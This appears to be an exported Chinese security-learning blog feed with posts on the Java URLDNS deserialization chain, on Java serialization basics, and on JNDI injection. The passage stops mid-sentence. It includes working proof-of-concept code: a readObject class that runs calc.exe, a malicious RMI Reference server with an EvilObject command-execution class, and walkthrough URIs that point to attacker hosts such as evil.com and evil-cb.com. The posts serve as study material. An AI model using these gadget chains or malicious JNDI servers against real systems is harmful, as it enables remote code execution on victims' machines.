FileInputStream(&quot;bin.ser&quot;)).readObject();    System.out.println(o);    &#125;&#125;</code></pre><p>运行时需要添加<code>--add-opens java.base/java.net=ALL-UNNAMED</code>  不然会报错</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021427567.png" alt="image-20230402142752339"></p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>这个利用链的入口在HashMap里，它实现了Serializable接口，说明它支持序列化和反序列化</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021636523.png" alt="image-20230402143132873"></p><p>在HashMap类中，它重写了readObjec()方法，在反序列化的执行过程中，就会优先执行这里的readObjec()方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021636208.png" alt="image-20230402143855396"></p><p>然后跟着链子往下,这是readObjec()最后一行代码，调用了<code>putVal()</code>方法，参数中使用了<code>hash(key)</code>，这个<code>key</code>就行我们传进去的url</p><p>,即<code>http://7zswrn.dnslog.cn</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021636604.png" alt="image-20230402144047378"></p><p>跟进<code>hash()</code>方法,发现里面调用的是Object.hashCode()方法，但是这不是我们想要的</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021636599.png" alt="image-20230402144603150"></p><p>需要调试获取我们想要的hashcode(),在<code>readObjec().putVal()</code>方法处下断点</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021637404.png" alt="image-20230402145209616"></p><p>步进，看到key就是我们传入的参数url</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021637991.png" alt="image-20230402145323587"></p><p>再步进，此时已经跳到了<code>URL</code>的hashCode()里面了，这里可以知道很清晰的代码逻辑，此时<code>hashCode==-1</code>,不会直接返回hashCode，而是执行<code>hashCode = handler.hashCode(this);</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021637711.png" alt="image-20230402150215474"></p><p>再步进，此时已经到了URLStreamHandler类，看到触发函数getHostAddress()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021637628.png" alt="image-20230402150338349"></p><p>继续步进，往下走，看到最终发起请求的方法<code>InetAddress.getByName()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021637276.png" alt="image-20230402152803865"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021638093.png" alt="image-20230402153437447"></p><p>PS:刚刚的地址失效了，重新获取了地址olliao.dnslog.cn</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021638558.png" alt="image-20230402154053223"></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>先创建两个对象</p><pre><code class="java">HashMap&lt;URL,Object&gt; hashMap=new HashMap&lt;&gt;();URL url = new URL(&quot;http://olliao.dnslog.cn&quot;);//主角</code></pre><p>添加键值对,值随便写</p><pre><code class="java">hashMap.put(url,1);</code></pre><p>看看put源码，会发现，它put方法里调用的hash(),key就是传进来的url,然后就是上面那套逻辑了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021638472.png" alt="image-20230402155135951"></p><p>URL中hashCode初始值为-1,说明还没有被初始化，初始化后会进行hash运算，hashCode的值会变成运算出来的hash</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021638237.png" alt="image-20230402155719523"></p><p>此时会运行到这里执行hashCode(),然后就因为hashCode&#x3D;-1发起请求包，还没反序列化就执行了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021638870.png" alt="image-20230402144603150"></p><p>所以要让它不发包，不能让hashCode&#x3D;-1,导致进行发包请求.</p><p>通过Java反射获取hashCode,把他修改</p><pre><code class="java">Field field= url.getClass().getDeclaredField(&quot;hashCode&quot;);</code></pre><p>因为hashCode是<code>private</code>私有属性，不能直接修改，所以打开对该字段的访问权限，让hashCode可以被操作</p><pre><code class="java">field.setAccessible(true);</code></pre><p>将 url 对象的 hashCode 字段的值设置为 123,只要不是<code>-1</code>就行</p><pre><code class="java">field.set(url,123);</code></pre><p>在后面，需要反序列化去操作它的时候，再把hashCode的值改回<code>-1</code>,这样才会去走那段发请求的代码</p><pre><code class="java">field.set(url,-1);</code></pre><p>然后就是序列化和反序列化操作了</p><pre><code class="java">new ObjectOutputStream(new FileOutputStream(&quot;bin.ser&quot;)).writeObject(hashMap);Object o = new ObjectInputStream(new FileInputStream(&quot;bin.ser&quot;)).readObject();System.out.println(o);//简单输出一下</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java序列化与反序列化</title>
      <link href="/2023/03/23/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/03/23/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java序列化与反序列化"><a href="#Java序列化与反序列化" class="headerlink" title="Java序列化与反序列化"></a>Java序列化与反序列化</h1><h2 id="什么是序列化和反序列化"><a href="#什么是序列化和反序列化" class="headerlink" title="什么是序列化和反序列化"></a>什么是序列化和反序列化</h2><p>序列化: 把Java对象转换为字节序列的过程</p><p>反序列化：把字节序列恢复为Java对象的过程</p><h2 id="序列化和反序列化的意义"><a href="#序列化和反序列化的意义" class="headerlink" title="序列化和反序列化的意义"></a>序列化和反序列化的意义</h2><p>序列化与反序列化的设计就是用来传输数据的。</p><p>当两个进程进行通信的时候，可以通过序列化反序列化来进行传输。</p><p><strong>序列化的好处:</strong></p><ul><li><p>能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。</p></li><li><p>利用序列化实现远程通信，在网络上传送对象的字节序列。</p></li></ul><p>**序列化与反序列化应用的场景: **</p><ul><li>想把内存中的对象保存到一个文件中或者是数据库当中。</li><li>用套接字在网络上传输对象。</li><li>通过 RMI 传输对象的时候。</li></ul><h2 id="常见的序列化和反序列化协议"><a href="#常见的序列化和反序列化协议" class="headerlink" title="常见的序列化和反序列化协议"></a>常见的序列化和反序列化协议</h2><ul><li>XML&amp;SOAP</li></ul><p>XML 是一种常用的序列化和反序列化协议，具有跨机器，跨语言等优点，SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议</p><ul><li>JSON</li><li>Protobuf</li></ul><h2 id="实现序列化和反序列化的方法"><a href="#实现序列化和反序列化的方法" class="headerlink" title="实现序列化和反序列化的方法"></a>实现序列化和反序列化的方法</h2><ul><li>java.io.ObjectOutputStream<br>序列化：首先给该类传入一个文件对象(用于写入序列化结果)，然后通过调用该类的 writeObject(目标对象) 方法将目标对象写入到文件</li><li>java.io.ObjectInputStream<br>反序列化：首先给该类传入一个文件对象(用于读取文件中的序列化结果)，然后通过调用该类的 readObject() 方法将其反序列化为目标对象</li></ul><h2 id="简单实现序列化"><a href="#简单实现序列化" class="headerlink" title="简单实现序列化"></a>简单实现序列化</h2><h3 id="Serializable"><a href="#Serializable" class="headerlink" title="Serializable"></a>Serializable</h3><p>将要序列化的类实现 <code>Serializabel</code> 接口（Serializable 接口是一个标记接口，不用实现任何方法。一旦实现了此接口，则表明该类的对象就是可序列化的），而且所有属性必须是可序列化的，就是如果一个可序列化的类的成员不是基本类型，也不是 String 类型，比如自己自定义的类，那这个引用类型也必须是可序列化的，否则，会导致此类不能序列化 (用 <code>transient</code> 关键字修饰的属性除外，不参与序列化过程) 。</p><p>例如：</p><p>实现一个Person类，其中<code>money</code>是被<code>transient</code>修饰的</p><pre><code class="java">import java.io.*;public class Person implements Serializable &#123;    public String name;    public int age;    public transient int money;    public Person(String name, int age,int money) &#123;        this.name = name;        this.age = age;        this.money = money;    &#125;&#125;</code></pre><p>实现序列化：序列化成功后会生成person.ser文件，里面存储的是person对象的所有属性和状态的字节序列</p><pre><code class="java">import java.io.*;public class SerializationExample &#123;    public static void main(String[] args) throws Exception &#123;        // 创建一个Person对象        Person person = new Person(&quot;T0dis&quot;, 18,100);                // 创建ObjectOutputStream对象                FileOutputStream fileOut = new FileOutputStream(&quot;person.ser&quot;);                ObjectOutputStream out = new ObjectOutputStream(fileOut);        // 序列化Java对象        out.writeObject(person);        // 关闭流        out.close();        fileOut.close();        System.out.println(&quot;反序列化成功&quot;);    &#125;&#125;</code></pre><p>实现反序列化： </p><pre><code class="java">import java.io.*;public class DeserializationExample &#123;    public static void main(String[] args) throws Exception &#123;        // 创建ObjectInputStream对象        FileInputStream fileIn = new FileInputStream(&quot;person.ser&quot;);                ObjectInputStream in = new ObjectInputStream(fileIn);        // 反序列化Java对象        Person person = (Person) in.readObject();        // 输出反序列化后的对象属性        System.out.println(person.name);        System.out.println(person.age);        System.out.println(person.money);        // 关闭流        in.close();        fileIn.close();//当io流不需要使用到时，一定要进行关闭流操作，否则很可能引起内存泄漏    &#125;&#125;</code></pre><p>反序列化的结果：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304011508055.png" alt="image-20230401150831703"></p><p>可以发现transient 修饰的 money没有被序列化，所以反序列化结果中没有值，如果是字符串，它的结果将是null</p><h3 id="Externalizable"><a href="#Externalizable" class="headerlink" title="Externalizable"></a>Externalizable</h3><p>Externalizable进行序列化和反序列化会比较麻烦，因为需要重写序列化和反序列化的方法，序列化的细节需要手动完成。当读取对象时，会调用被序列化类的无参构造器去创建一个新的对象，然后再将被保存对象的字段的值分别填充到新对象中。因此，实现Externalizable接口的类必须要提供一个无参的构造器，且它的访问权限为public。</p><p>创建了一个 <code>Person</code> 对象</p><pre><code class="java">import java.io.*;class Person implements Externalizable &#123;    private String name;    private int age;    public Person() &#123;&#125; // 构造函数需要提供无参构造方法    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;        //下面是重写方法，在下面的代码中，transient关键字就不起作用了    @Override    public void writeExternal(ObjectOutput out) throws IOException &#123;        out.writeObject(name); // 写入 name 属性        out.writeInt(age); // 写入 age 属性    &#125;    @Override    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123;        name = (String) in.readObject(); // 读取 name 属性        age = in.readInt(); // 读取 age 属性    &#125;&#125;</code></pre><p>序列化和反序列化的过程</p><pre><code class="java">public class Main &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        Person person = new Person(&quot;Lucy&quot;, 18);        System.out.println(&quot;Before serialization: &quot; + person);        // 序列化        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(person);        // 反序列化        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());        ObjectInputStream ois = new ObjectInputStream(bais);        Person newPerson = (Person) ois.readObject();        System.out.println(&quot;After deserialization: &quot; + newPerson);    &#125;&#125;</code></pre><h2 id="反序列化后命令执行"><a href="#反序列化后命令执行" class="headerlink" title="反序列化后命令执行"></a>反序列化后命令执行</h2><pre><code class="java">import java.io.*;class RUN_C implements java.io.Serializable&#123;    public String name;    public String motto;    // 自定义 readObject 方法    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException&#123;        //执行默认的readObject()方法        in.defaultReadObject();        //执行命令        Runtime.getRuntime().exec(&quot;calc.exe&quot;);    &#125;&#125;public class SerializeTest &#123;    public static void main(String [] args) throws IOException, ClassNotFoundException&#123;        //实例化一个可序列化对象        RUN_C testClass = new RUN_C();        testClass.name = &quot;Haker by xxxxxx&quot;;        testClass.motto = &quot;Haker!&quot;;        //序列化        //将序列化后的对象写入到文件        FileOutputStream fos = new FileOutputStream(&quot;test.ser&quot;);        ObjectOutputStream os = new ObjectOutputStream(fos);        os.writeObject(testClass);        os.close();        fos.close();        //反序列化        RUN_C obj = null;        //从文件读取序列化的结果后进行反序列化        FileInputStream fis = new FileInputStream(&quot;test.ser&quot;);        ObjectInputStream ois = new ObjectInputStream(fis);        obj = (RUN_C)ois.readObject();        ois.close();        fis.close();        System.out.println(obj.name);        //System.out.println(obj.motto);    &#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304012026631.png" alt="image-20230401202615699"></p><p>使用WinHex查看序列化生成的test.ser文件：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304012029028.png" alt="image-20230401202927501"></p><ul><li>AC ED：Java序列化文件的魔数。</li><li>00 05：版本号，其中00 05表示主版本号为0，次版本号为5。</li><li>73 72：常量流（常量池）的标识符，代表下面的字节流是常量池信息。</li><li>00 05：常量池信息的长度，即5个字节。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入学习</title>
      <link href="/2023/03/19/JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/03/19/JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="JNDI注入学习"><a href="#JNDI注入学习" class="headerlink" title="JNDI注入学习"></a>JNDI注入学习</h1><h2 id="理解JNDI"><a href="#理解JNDI" class="headerlink" title="理解JNDI"></a>理解JNDI</h2><p>JNDI是Java命名和目录接口，是Java的一个目录服务应用程序接口，它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。——–维基百科</p><p>很官方，看不懂 建议看这篇文章理解    <a href="https://blog.csdn.net/wn084/article/details/80729230">https://blog.csdn.net/wn084/article/details/80729230</a></p><p>通俗易懂的解释就是就是把资源取个名字，再根据名字来找资源,就像人的身份证或DNS中的域名与IP的关系</p><p>另一种理解：JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。</p><p>JNDI支持的服务主要有：<code>DNS</code>、<code>LDAP</code>、<code>CORBA</code>、<code>RMI</code>等</p><h4 id="Java-Naming"><a href="#Java-Naming" class="headerlink" title="Java Naming"></a>Java Naming</h4><p>命名服务是一种键值对的绑定，使应用程序可以通过键检索值。</p><h4 id="Java-Directory"><a href="#Java-Directory" class="headerlink" title="Java Directory"></a>Java Directory</h4><p>目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。</p><p>JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。</p><h4 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h4><p>Object Factory用于将Naming Service（如RMI&#x2F;LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。</p><p>JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。</p><h2 id="JNDI代码示例"><a href="#JNDI代码示例" class="headerlink" title="JNDI代码示例"></a>JNDI代码示例</h2><p>先写个用于测试的<code>Person</code>类</p><pre><code class="java">import java.io.Serializable;import java.rmi.Remote;public class Person implements Remote, Serializable &#123;    private static final long serialVersionUID = 1L;    private String name;    private String password;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getPassword() &#123;        return password;    &#125;    public void setPassword(String password) &#123;        this.password = password;    &#125;    public String toString()&#123;        return &quot;name:&quot;+name+&quot; password:&quot;+password;    &#125;&#125;</code></pre><p>这段代码实现了两个接口：Remote和Serializable。其中，Remote是Java远程方法调用（RMI）机制中的标记接口，用于表明该类的实例可以被远程访问；Serializable则是Java序列化机制中的标记接口，用于表明该类的实例可以被序列化成字节流并传输。</p><p>除了这两个接口之外，Person类还有两个私有属性：name和password，分别表示人名和密码。它们都提供了对应的getter和setter方法，用于获取和设置属性值。此外，还定义了一个toString()方法，用于将Person对象转换成字符串形式返回。</p><p>下面是服务端：</p><pre><code>import javax.naming.Context;import javax.naming.InitialContext;import java.rmi.registry.LocateRegistry;public class Server &#123;    public static void initPerson() throws Exception &#123;        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常        LocateRegistry.createRegistry(6666);        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:6666&quot;);        //初始化        InitialContext ctx = new InitialContext();        //实例化person对象        Person p = new Person();        p.setName(&quot;T0dis&quot;);        p.setPassword(&quot;helloworld!&quot;);        //person对象绑定到JNDI服务中，JNDI的名字叫做：person。        ctx.bind(&quot;person&quot;, p);        ctx.close();    &#125;    public static void main(String[] args) throws Exception &#123;        initPerson();        System.out.println(&quot;Server is running and waiting for client to connect...&quot;);        //加入阻塞代码，使Server一直运行        Object lock = new Object();        synchronized (lock) &#123;            lock.wait();        &#125;    &#125;&#125;</code></pre><p>服务端的代码使用Java RMI实现了JNDI服务。实现过程如下：</p><ol><li>在initPerson()方法中，首先使用 <code>LocateRegistry.createRegistry</code> 方法创建了一个 RMI Registry 对象。这个对象被绑定到本地6666端口。RMI Registry 是一个注册表，它维护了所有注册到它的对象。在这个例子中，Person对象将被绑定到RMI Registry中。</li><li>然后设置了JNDI的工厂和JNDI的url和端口参数。这些参数在创建InitialContext对象时会使用到。如果未设置这些参数，则无法连接到JNDI服务并将导致 NoInitialContextException 异常。</li><li>创建 InitialContext 对象。这个对象将用作与JNDI服务通讯的主要入口。可以使用 <code>ctx.bind</code> 方法来将一个Person对象绑定到 JNDI服务中，这个对象的名字被指定为 “person”。</li><li>创建了一个Person对象，并设置了它的属性（即名称和密码）。</li><li>将Person对象绑定到JNDI服务中，以便客户端可以查询和使用它。</li></ol><p>下面的是客户端的代码：</p><pre><code>import javax.naming.Context;import javax.naming.InitialContext;public class Client &#123;    public static void main(String[] args)throws Exception &#123;        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:6666&quot;);        InitialContext ctx = new InitialContext();        //通过lookup查找person对象        Person person = (Person) ctx.lookup(&quot;person&quot;);        //打印出这个对象        System.out.println(person.toString());        ctx.close();    &#125;&#125;</code></pre><ol><li>通过使用System.setProperty()方法，设置 JNDI 的工厂和目标端口，以便获取RMI对象。</li><li>使用 InitialContext 类创建一个新的 JNDI 上下文并将其赋值给 ctx 对象。</li><li>查找在服务端已经在RMI注册表上注册了的“person”对象，并将其赋值给person对象。</li><li>输出 person 对象的 toString 方法的返回值。</li><li>关闭ctx，释放与JNDI上下文的所有资源</li></ol><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。</p><ul><li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li><li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li><li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li></ul><p>在上面的代码示例中客户端 <code>Person person = (Person) ctx.lookup(&quot;person&quot;);</code>，如果<code>lookup</code>函数的参数可控,就有可能会造成<code>JNDI注入</code></p><p>官方一点的解释：JNDI 注入<strong>就是控制 lookup 函数的参数，这样来使客户端访问恶意的 RMI 或者 LDAP 服务来加载恶意的对象，从而执行代码</strong>，完成利用在 JNDI 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 Reference 类实现的</p><p>大概过程：</p><p><img src="https://miro.medium.com/v2/resize:fit:560/1*JH6AblHnH7grDeyGMRHKZg.png" alt="img"></p><p>① 攻击者为易受攻击的JNDI的lookup方法提供了LDAP&#x2F;RMI URL</p><p>② 目标服务器连接到远端LDAP&#x2F;RMI服务器，LDAP&#x2F;RMI服务器返回恶意JNDI引用</p><p>③ 目标服务器解码JNDI引用</p><p>④ 从远端LDAP&#x2F;RMI服务器获取Factory类</p><p>⑤ 目标服务器实例化Factory类</p><p>⑥ payload得到执行。</p><h2 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h2><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名&#x2F;目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p><p>构造方法</p><pre><code class="java">Reference(String className)     为类名为“className”的对象构造一个新的引用。  Reference(String className, RefAddr addr)     为类名为“className”的对象和地址构造一个新引用。  Reference(String className, RefAddr addr, String factory, String factoryLocation)     为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  Reference(String className, String factory, String factoryLocation)     为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </code></pre><pre><code>String url = &quot;http://127.0.0.1:8080&quot;;Reference reference = new Reference(&quot;test&quot;, &quot;test&quot;, url);</code></pre><p>参数1：<code>className</code> - 远程加载时所使用的类名</p><p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p><p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p><h2 id="JNDI-RMI的攻击面"><a href="#JNDI-RMI的攻击面" class="headerlink" title="JNDI_RMI的攻击面"></a>JNDI_RMI的攻击面</h2><h4 id="RMI-Reference利用"><a href="#RMI-Reference利用" class="headerlink" title="RMI+Reference利用"></a>RMI+Reference利用</h4><p>Reference类：</p><p>Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用。</p><p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p><p>在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。</p><p>几个比较关键的属性：</p><ul><li>className：远程加载时所使用的类名；</li><li>classFactory：加载的class中需要实例化类的名称；</li><li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file&#x2F;ftp&#x2F;http等协议</li></ul><p><strong>这个类中包含被引用对象的类信息和地址</strong>。</p><p>因为在JNDI中，对象传递要么是序列化方式存储（对象的拷贝，对应按值传递），要么是按照引用（对象的引用，对应按引用传递）来存储，当序列化不好用的时候，我们可以使用Reference将对象存储在JNDI系统中。so，利用思路如下：</p><p><strong>将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</strong></p><p><img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/6.png" alt="img"></p><ol><li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li><li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li><li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code>想绑定的 ReferenceWrapper 对象（<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>）；</li><li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li><li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li><li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li></ol><p> <strong>PS</strong>: JNDI协议动态转换即在运行时动态地切换JNDI提供者的类型或实现。这种转换可以在应用程序的代码中发生，例如在代码中更改JNDI上下文的URL以使用不同的服务提供者。这样可以在不修改应用程序代码的情况下实现切换和更改JNDI提供者。类比于换手机卡，不同的卡可以提供不同的服务，可以根据需要更换卡来达到切换服务的目的</p><p>我的JDK版本是jdk1.8.0_361 </p><p>客户端代码：</p><pre><code class="java">import javax.naming.Context;import javax.naming.InitialContext;public class Client &#123;    public static void main(String[] args)throws Exception &#123;        System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);//允许RMI协议进行远程调，可能是JDK版本的问题,没有这个会报错        String uri = &quot;rmi://127.0.0.1:1099/refObj&quot;;        Context ctx = new InitialContext();        System.out.println(&quot;Using lookup() to fetch object with &quot; + uri);        ctx.lookup(uri);    &#125;&#125;</code></pre><p>服务端：</p><pre><code class="java">import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.Reference;import com.sun.jndi.rmi.registry.ReferenceWrapper;public class Server &#123;    public static void main(String args[]) throws Exception &#123;        Registry registry = LocateRegistry.createRegistry(1099);        Reference refObj = new Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://127.0.0.1:8080/&quot;);        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);        System.out.println(&quot;Binding &#39;refObjWrapper&#39; to &#39;rmi://127.0.0.1:1099/refObj&#39;&quot;);        registry.bind(&quot;refObj&quot;, refObjWrapper);    &#125;&#125;</code></pre><p>恶意类(弹计算机)：</p><pre><code class="java">public class EvilObject &#123;    public EvilObject() throws Exception &#123;        Runtime rt = Runtime.getRuntime();        String[] commands = &#123;&quot;cmd&quot;, &quot;/C&quot;, &quot;calc.exe&quot;&#125;;        Process pc = rt.exec(commands);        pc.waitFor();    &#125;&#125;</code></pre><p>为了防止漏洞复现过程中应用端实例化EvilObject对象时从CLASSPATH当前路径找到编译好的字节代码，而不去远端进行下载的情况发生，将Server和Client放在同一个文件夹，EvilObject放在另外的文件夹</p><p>在复现过程中，发现EvilObject并没有被远程加载，只能加载当前路径编译好的字节代码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202303201903952.png" alt="image-20230320190331836"></p><p>查找原因：</p><ul><li>在jdk &lt; jdk8u121 之前才能通过reference 加载远程class</li></ul><h4 id="lookup参数注入"><a href="#lookup参数注入" class="headerlink" title="lookup参数注入"></a>lookup参数注入</h4><p>当JNDI客户端的lookup()函数的参数可控即URI可控时，根据JNDI协议动态转换的原理，攻击者可以传入恶意URI地址指向攻击者的RMI注册表服务，以使受害者客户端加载绑定在攻击者RMI注册表服务上的恶意类，从而实现远程代码执行</p><p>这个的思路和上面的是一样的</p><p>下面的客户端代码，这里假设lookup()参数是可控的，rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Foo是用户输入的，</p><pre><code class="java">import javax.naming.InitialContext;import javax.naming.NamingException;public class Client &#123;    public static void main(String[] args) &#123;        try &#123;            System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);            Object ret = new InitialContext().lookup(&quot;rmi://127.0.0.1:1099/Foo&quot;);            System.out.println(&quot;ret: &quot; + ret);        &#125; catch (NamingException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>下面是攻击者搭建的恶意RMI注册表服务：</p><pre><code class="java">import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Server &#123;    public static void main(String args[]) &#123;        try &#123;            // 通过调用LocateRegistry类的createRegistry()方法并将默认端口号1099作为参数创建一个注册表            Registry registry = LocateRegistry.createRegistry(1099);            // 指定要执行的恶意对象的URL，并创建一个Reference类的新对象            String factoryUrl = &quot;http://localhost:1098/&quot;;            Reference reference = new Reference(&quot;EvilObject&quot;,&quot;EvilObject&quot;, factoryUrl);            // 用ReferenceWrapper类包装恶意引用            ReferenceWrapper wrapper = new ReferenceWrapper(reference);            // 使用名称“Foo”将恶意对象绑定到注册表中            registry.bind(&quot;Foo&quot;, wrapper);            System.err.println(&quot;Server ready, factoryUrl:&quot; + factoryUrl);        &#125; catch (Exception e) &#123;            System.err.println(&quot;Server exception: &quot; + e.toString());            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>恶意类(弹计算机)：</p><pre><code class="java">public class EvilObject &#123;    public EvilObject() throws Exception &#123;        Runtime rt = Runtime.getRuntime();        String[] commands = &#123;&quot;cmd&quot;, &quot;/C&quot;, &quot;calc.exe&quot;&#125;;        Process pc = rt.exec(commands);        pc.waitFor();    &#125;&#125;</code></pre><p>模拟场景，攻击者开启恶意RMI注册表服务Server，同时恶意类EvilObject放置在同一环境中，由于JNDI客户端的lookup()函数参数可控，因为当客户端输入指向Server的URI进行lookup操作时就会触发JNDI注入漏洞，导致远程代码执行。<strong>PS</strong>:这些代码只适用于低版本的jdk,<code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code>，运行时需加入参数 